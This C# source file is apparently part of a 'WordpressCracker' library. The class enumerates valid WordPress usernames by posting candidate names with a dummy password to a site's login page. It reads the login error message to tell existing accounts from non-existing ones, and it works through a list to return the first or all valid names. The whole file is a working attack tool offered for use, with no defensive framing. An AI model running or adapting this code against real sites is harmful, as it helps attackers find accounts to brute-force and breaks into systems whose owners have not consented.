using Opapps.Lib.WordpressCracker.Entities;
using Opapps.Lib.WordpressCracker.Entities.Interfaces;
using Opapps.Lib.WordpressCracker.Helpers;
using Opapps.Lib.WordpressCracker.Helpers.Interfaces;
using Opapps.Lib.WordpressCracker.Services.Abstracts;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Opapps.Lib.WordpressCracker.Services
{
    public class WordpressUsernameCracker : WordpressCrackerService
    {
        private readonly static IHtmlParser _htmlParser = new HtmlParser();
        private IUsernameCrackingConfiguration _config;

        public IUsernameCrackingConfiguration Config { get => _config; set => _config = value; }

        public event Action<CrackingActivityMessageType, string> NewActivityInfo;
        public WordpressUsernameCracker() : base()
        {
            _config = new UsernameCrackingConfiguration();
        }

        public WordpressUsernameCracker(IRequestConfiguration requestConfig) : base(requestConfig)
        {
            _config = new UsernameCrackingConfiguration();
        }

        public WordpressUsernameCracker(IUsernameCrackingConfiguration config) : base()
        {
            _config = config;
        }

        public WordpressUsernameCracker(IUsernameCrackingConfiguration config, IRequestConfiguration requestConfig) : base(requestConfig)
        {
            _config = config;
        }


        public async Task<bool> AttemptGettingValidUsername(Uri loginUrl, string username)
        {
            NewActivityInfo?.Invoke(CrackingActivityMessageType.INFO, String.Format("Begin validating username {0}.", username));

            using HttpResponseMessage response = await PostAsync(loginUrl, new FormData(username, _config.DummyPassword));
            response.EnsureSuccessStatusCode();
            string htmlContent = await GetHtmlContent(response);

            string? errorMessageOuterHtml = _htmlParser.GetOuterHtmlWithXpath("//div[@id = 'login_error']", htmlContent)?.Trim();

            bool isPasswordInvalid = CheckPasswordInvalid(errorMessageOuterHtml);

            OnNewUsernameCrackingResultInfo(username, isPasswordInvalid);

            return isPasswordInvalid;
        }

        private void OnNewUsernameCrackingResultInfo(string username, bool isPasswordInvalid)
        {
            if (isPasswordInvalid)
            {
                NewActivityInfo?.Invoke(CrackingActivityMessageType.SUCCESS, String.Format("RESULT: Username {0} is valid.", username));
            }

            else
            {
                NewActivityInfo?.Invoke(CrackingActivityMessageType.FAILURE, String.Format("RESULT: Username {0} is invalid.", username));

            }
        }

        /// <summary>
        /// Check to see for a valid username, and will stop executing after getting a valid username.
        /// </summary>
        /// <returns>The valid username if exists, otherwise empty string</returns>
        public async Task<string> AttemptGettingValidUsernameRange(Uri loginUrl, IEnumerable<string> usernames)
        {
            NewActivityInfo?.Invoke(CrackingActivityMessageType.INFO, "Begin validating usernames from the list.");

            foreach(var username in usernames)
            {
                bool isValidUsername = await AttemptGettingValidUsername(loginUrl, username);
                if (isValidUsername) return username;
            }

            NewActivityInfo?.Invoke(CrackingActivityMessageType.INFO, "The execution has been finished");

            return String.Empty;
        }

        /// <summary>
        /// Check to see for all valid usernames
        /// </summary>
        /// <returns>The valid usernames if any, otherwise empty array</returns>
        public async Task<IEnumerable<string>> AttemptGettingValidUsernamesRange(Uri loginUrl, IEnumerable<string> usernames) 
        {
            NewActivityInfo?.Invoke(CrackingActivityMessageType.INFO, "Begin validating usernames from the list.");

            List<string> validUsernames = new();

            foreach (var username in usernames)
            {
                bool isValidUsername = await AttemptGettingValidUsername(loginUrl, username);
                if (isValidUsername) validUsernames.Add(username);
            }

            NewActivityInfo?.Invoke(CrackingActivityMessageType.INFO, "The execution has been finished");

            return validUsernames;
        }

        protected virtual Task<string> GetHtmlContent(HttpResponseMessage response)
        {
            return response.Content.ReadAsStringAsync();
        }

        /**
         * Probably we don't even need this anymore.
         **/
        private static bool CheckUsernameInvalid(string? errorMessage, IUsernameCrackingConfiguration config)
        {
            if (errorMessage == null) return false; // login success, wew. 1/100000000000 probability.

            if (config.AutoDetectUsernameErrorMessage) {
                // TODO : implement the auto-detect
                throw new NotImplementedException("Sorry, for auto-detect username error message feature, currently haven't been implemented");
            } 
            
            // Calculate similarity to check to see if the error message that we get is a wrong username error message.
            return (config.UsernameErrorMessage.CalculateSimilarityWith(errorMessage) > 0.65);
        }

        private static bool CheckPasswordInvalid(string? errorMessageHtml)
        {
            return errorMessageHtml != null && errorMessageHtml.Contains("action=lostpassword");
        }

    }
}
